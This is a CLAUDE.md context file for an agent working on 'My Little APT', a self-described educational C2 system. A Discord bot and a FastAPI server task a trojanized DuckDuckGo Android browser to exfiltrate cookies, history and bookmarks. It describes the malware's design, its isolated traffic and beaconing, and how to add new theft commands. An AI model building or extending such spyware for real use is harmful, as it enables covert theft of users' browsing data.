# CLAUDE.md

This file provides context for Claude Code (or any LLM agent) working on this repository.

## Project Identity

**My Little APT** is an educational C2 (Command and Control) system composed of three modules that form a closed loop:

1. **Discord Bot** (`discord-bot/`) — Admin panel (Python, discord.py)
2. **C2 Server** (`server/`) — Backend API (Python, FastAPI)
3. **Trojan Client** (`trojan-ddg/`) — Trojanized DuckDuckGo Android browser (Kotlin, Dagger/Anvil)

The admin issues commands via Discord → the server queues them → the Android client polls, executes, and reports back → the server stores results → the admin reads them via Discord.

---

## Repository Layout

```
my-little-apt/
├── discord-bot/              # Python — Discord bot (admin panel)
│   ├── bot.py                # Entry point: slash commands, access control, HTTP bridge
│   ├── devices.py            # DeviceManager class (standalone/fallback state)
│   ├── config.py             # REAL config (gitignored — has secrets)
│   ├── config-example.py     # Template for config.py
│   ├── requirements.txt      # Runtime deps (discord.py, httpx)
│   ├── requirements-dev.txt  # Dev deps (pytest, pytest-asyncio, mypy, bandit)
│   └── tests/
│       ├── test_bot.py       # 49 tests — slash commands, access control, autocomplete
│       ├── test_config.py    # 14 tests — config constant validation
│       └── test_devices.py   # 46 tests — DeviceManager logic
│
├── server/                   # Python — FastAPI C2 server
│   ├── server.py             # Entry point: FastAPI app with admin + beacon endpoints
│   ├── command_handler.py    # CommandHandler class — device registry + per-device task queue
│   ├── models.py             # Pydantic models (BeaconCheckIn, ServerConfig, TaskResponse, etc.)
│   ├── config.py             # REAL config (gitignored)
│   ├── config-example.py     # Template
│   ├── requirements.txt
│   ├── requirements-dev.txt
│   └── tests/
│       ├── test_server.py         # 67 tests — API endpoint tests
│       └── test_command_handler.py # 22 tests — state + task queue tests
│
├── trojan-ddg/               # Kotlin — Modified DuckDuckGo Android browser
│   └── trojan/               # C2 beacon module (follows DDG's API/impl pattern)
│       ├── trojan-api/       # Interface contracts (published to other modules)
│       │   └── src/main/java/com/duckduckgo/trojan/api/
│       │       ├── BeaconService.kt   # interface BeaconService { checkIn(), sendResult() }
│       │       └── PendingCommand.kt  # data class PendingCommand(id, type, payload: Map)
│       │
│       └── trojan-impl/      # Implementation (Dagger-wired, never imported directly)
│           ├── src/main/java/com/duckduckgo/trojan/impl/
│           │   ├── C2ApiService.kt      # Retrofit interface matching server endpoints
│           │   ├── C2NetworkModule.kt   # @Named("c2") OkHttp + Retrofit (isolated stack)
│           │   ├── RealBeaconService.kt # Implements BeaconService (check-in + poll + result)
│           │   ├── CommandHandler.kt    # Dispatches request-cookies/history/bookmarks
│           │   └── BeaconWorker.kt      # OneTimeWorkRequest chain + BeaconInitializer
│           │
│           └── src/test/java/com/duckduckgo/trojan/impl/
│               ├── BeaconWorkerTest.kt       # 10 tests (Robolectric)
│               ├── CommandHandlerTest.kt     # 9 tests (Robolectric)
│               └── RealBeaconServiceTest.kt  # 7 tests (mockito)
│
├── .github/workflows/        # CI/CD pipelines (one per component)
├── README.md                 # User-facing deployment guide
└── CLAUDE.md                 # This file
```

---

## The C2 Cycle (End-to-End Data Flow)

Understanding this cycle is critical. Every feature touches at least two modules.

```
   ADMIN (Discord)                 SERVER (FastAPI)                CLIENT (Android)
   ──────────────                  ────────────────                ────────────────
   /queue-task ──────────────────▶ POST /admin/queue-task
     device="POCO_F5"                stores in per-device queue
     task_type="request-cookies"     (command_handler.task_queues)
     parameters={"domains":"..."}

                                                                  BeaconWorker fires
                                   POST /beacon/check-in ◀─────── checkIn() sends device info
                                     registers device              gets beacon_interval
                                   GET /beacon/tasks/POCO_F5 ◀──── polls for tasks
                                     dequeues tasks (fire-once)    receives TaskDto list
                                                                  CommandHandler.execute()
                                                                    reads CookieManager
                                   POST /beacon/result ◀────────── sends result JSON
                                     stores in results
                                                                  scheduleNext(interval)

   /request-cookies ─────────────▶ GET /admin/cookies
     shows cached +                  returns stored cookies
     auto-queues fresh task        POST /admin/queue-task ◀──────── (also auto-queued)
```

### Key Architectural Decisions

- **Fire-once queue:** Tasks are deleted from the server after the client polls them. There's no "pending" state tracking after delivery.
- **Dynamic beacon interval:** The server returns `beacon_interval` in check-in and task responses. The client uses `OneTimeWorkRequest` chaining (not `PeriodicWorkRequest`) so intervals can be as short as 15 seconds.
- **Isolated networking:** The trojan's OkHttp/Retrofit stack is `@Named("c2")` — completely separated from DDG's own networking to prevent traffic leaks.
- **API/impl split:** The trojan follows DDG's module pattern: `trojan-api` defines interfaces, `trojan-impl` provides Dagger-wired implementations. Other DDG modules only see `trojan-api`.

---

## Module Details

### Discord Bot (`discord-bot/`)

**Language:** Python 3.12+
**Framework:** discord.py with `app_commands` (slash commands)
**HTTP Client:** httpx (async) for communicating with the server

#### Architecture
- `bot.py` is the single entry point. All slash commands are defined here.
- Each command checks `is_admin_user()` first (whitelist by Discord user ID).
- Commands call `call_server(path, method, json_body)` to bridge to the FastAPI server.
- If the server is unreachable, commands fall back to `DeviceManager` (standalone mode with demo data).

#### Command Pattern
Every slash command follows this pattern:
```python
@bot.tree.command(name="...", description="...")
async def command_name(interaction: discord.Interaction, arg: type) -> None:
    if not is_admin_user(interaction): return denied
    log_command(interaction, "command-name")
    server_response = await call_server("/admin/endpoint", ...)
    if server_response:
        response = format_server_*(server_response)
    else:
        response = device_manager.fallback_method()
    await interaction.response.send_message(response)
```

#### Config Constants
```python
VALID_BEACON_INTERVALS = [15, 30, 60, 120]      # seconds
VALID_COMMUNICATION_PROTOCOLS = ["http", "https", "dns"]
```

#### Testing
- Tests use `pytest` + `pytest-asyncio`.
- Slash command callbacks are accessed via `bot_module.command_name.callback`.
- `_make_interaction()` creates a mocked `discord.Interaction`.
- Server calls are mocked with `patch("bot.call_server", ...)`.

### Server (`server/`)

**Language:** Python 3.12+
**Framework:** FastAPI with uvicorn
**State:** In-memory (no database) — `CommandHandler` singleton holds all state

#### Architecture
- `server.py` defines all FastAPI routes. Two groups: `/admin/*` (bot-facing) and `/beacon/*` (client-facing).
- `command_handler.py` contains `CommandHandler` — a class that manages the device registry, server config, and per-device task queues.
- `models.py` defines Pydantic models for request/response validation.

#### Task Queue
```python
# command_handler.py
class CommandHandler:
    devices: dict[str, DeviceInfo]          # name -> device info
    server_config: ServerConfig             # beacon_interval, protocol
    task_queues: dict[str, list[TaskResponse]]  # device_name -> [tasks]
```
- `queue_task(device_name, task_type, params)` adds to the queue.
- `queue_task_for_all(task_type, params)` adds to ALL registered devices.
- `dequeue_tasks(device_name)` returns and removes all tasks for that device.

#### Endpoint Flow
```
POST /admin/queue-task → handler.queue_task() → stored in task_queues
GET  /beacon/tasks/{name} → handler.dequeue_tasks() → tasks returned and removed
POST /beacon/result → handler.store_result() → results stored
```

#### Testing
- Tests use `pytest` + `httpx.AsyncClient` with `ASGITransport(app)`.
- Each test class resets `handler.task_queues` via a fixture.
- All 67 tests cover: check-in, device listing, cookies, intervals, protocol, task queue lifecycle.

### Trojan Client (`trojan-ddg/trojan/`)

**Language:** Kotlin
**Build:** Gradle (multi-module Android project)
**DI:** Dagger + Anvil (compile-time code generation)
**Networking:** OkHttp + Retrofit
**Scheduling:** WorkManager (OneTimeWorkRequest chain)

#### Architecture
- **trojan-api** module: Exposes `BeaconService` interface and `PendingCommand`/`CheckInResult` data classes. Other modules depend on this.
- **trojan-impl** module: Contains all implementation wired via Anvil/Dagger.

#### Key Classes

| Class | Role |
|---|---|
| `BeaconService` | Interface: `checkIn(): CheckInResult`, `sendResult(id, data)` |
| `CheckInResult` | Data class: `commands: List<PendingCommand>`, `beaconInterval: Int` |
| `PendingCommand` | Data class: `id: String`, `type: String`, `payload: Map<String, Any>` |
| `RealBeaconService` | Implementation: POST check-in → GET tasks → returns CheckInResult |
| `CommandHandler` | Interface + `RealCommandHandler`: dispatches `request-cookies`, `request-history`, `request-bookmarks` |
| `BeaconWorker` | `CoroutineWorker`: calls `checkIn()`, executes commands, sends results, schedules next run |
| `BeaconInitializer` | `MainProcessLifecycleObserver`: enqueues first `OneTimeWorkRequest` on app start |
| `C2ApiService` | Retrofit interface matching server `/beacon/*` endpoints |
| `C2NetworkModule` | Dagger module: provides `@Named("c2")` OkHttp + Retrofit + C2ApiService |

#### Beacon Self-Rescheduling Chain
```
App start → BeaconInitializer.onCreate()
  └→ enqueueUniqueWork("c2_beacon", KEEP, OneTimeWorkRequest(delay=15s))

BeaconWorker.doWork()
  ├→ checkIn() → CheckInResult(commands=[...], beaconInterval=60)
  ├→ execute each command
  ├→ sendResult() for each
  └→ scheduleNext(60) → enqueueUniqueWork("c2_beacon", REPLACE, OneTimeWorkRequest(delay=60s))
       └→ doWork() fires again after 60s ...
```

#### Important: JAVA_HOME
Android Studio's bundled JBR must be used for command-line builds:
```bash
JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr
```

#### Testing
- Uses **Robolectric** (no physical device needed) + **Mockito-Kotlin**.
- `TestListenableWorkerBuilder` creates testable `BeaconWorker` instances.
- All mocks are injected via `worker.beaconService = mockBeaconService`.
- DDG provides `CoroutineTestRule` for structured concurrency in tests.

---

## How to Run Tests

```bash
# Server (67 tests)
cd server && python -m pytest tests/ -v

# Discord Bot (109 tests)
cd discord-bot && python -m pytest tests/ -v

# Android Client (26 tests)
cd trojan-ddg && JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr \
  ./gradlew :trojan-impl:testDebugUnitTest
```

All 3 test suites must pass before committing.

---

## Coding Conventions

### Python (bot + server)
- **Style:** PEP 8, enforced by `ruff` (linter) and `mypy` (type checker).
- **Type hints:** All function signatures must have type annotations.
- **Docstrings:** All classes and public functions.
- **Test naming:** `test_<scenario>` inside `class Test<ComponentName>`.
- **Async:** All server endpoints and bot commands are `async`.

### Kotlin (trojan client)
- **Style:** DDG's `ktlint` configuration (see `trojan-ddg/.editorconfig`).
- **Module pattern:** New features go in `trojan-api` (interface) + `trojan-impl` (implementation). Never import `trojan-impl` directly.
- **DI annotations:** Use `@ContributesBinding(AppScope::class)` for implementations, `@SingleInstanceIn(AppScope::class)` for singletons.
- **Test naming:** `when<Condition>Then<ExpectedBehavior>` (DDG convention).

### Cross-Module Changes
When adding a new command (e.g., `request-autofill`):
1. **Server:** No changes needed — the generic `/admin/queue-task` accepts any `task_type`.
2. **Bot:** Add a slash command in `bot.py` that calls `POST /admin/queue-task`.
3. **Client:** Add a handler branch in `CommandHandler.kt`'s `when` block.
4. **Tests:** Add tests in all affected modules.

---

## Config Files

`config.py` files are **gitignored** — they contain real credentials.

| File | Template | Contains |
|---|---|---|
| `server/config.py` | `config-example.py` | `SERVER_HOST`, `SERVER_PORT`, `VALID_BEACON_INTERVALS` |
| `discord-bot/config.py` | `config-example.py` | `DISCORD_BOT_TOKEN`, `ADMIN_DISCORD_ID`, `C2_SERVER_URL` |

The C2 server URL in the Android client is hardcoded in:
```
trojan-ddg/trojan/trojan-impl/src/main/java/com/duckduckgo/trojan/impl/di/C2NetworkModule.kt
```

---

## CI/CD

Each component has its own GitHub Actions workflow triggered by `paths` filters:

| Pipeline | Trigger | Tools |
|---|---|---|
| `discord-bot-ci.yml` | `discord-bot/**` | ruff, mypy, bandit, pytest, pip-audit |
| `server-ci.yml` | `server/**` | ruff, mypy, bandit, pytest, pip-audit |
| `trojan-ci.yml` | `trojan-ddg/trojan/**` | `./gradlew :trojan-impl:testDebugUnitTest` |

---

## Common Pitfalls

1. **Missing JAVA_HOME:** Android builds fail without it. Always set to Android Studio's JBR path.
2. **Config files not created:** Both Python modules will crash on import if `config.py` doesn't exist. Copy from `config-example.py`.
3. **Payload serialization:** `PendingCommand.payload` is `Map<String, Any>`, not a String. Never use `.toString()` on it — use direct map access like `payload["domains"]`.
4. **WorkManager minimum intervals:** Android's `PeriodicWorkRequest` has a 15-minute minimum. That's why we use `OneTimeWorkRequest` chains instead.
5. **Network isolation:** The C2 Retrofit client uses `@Named("c2")` — do NOT merge it with DDG's default HTTP client.
6. **Fire-once tasks:** Tasks are removed from the server queue when polled. There is no "re-queue" mechanism — if the client crashes mid-execution, the task is lost.
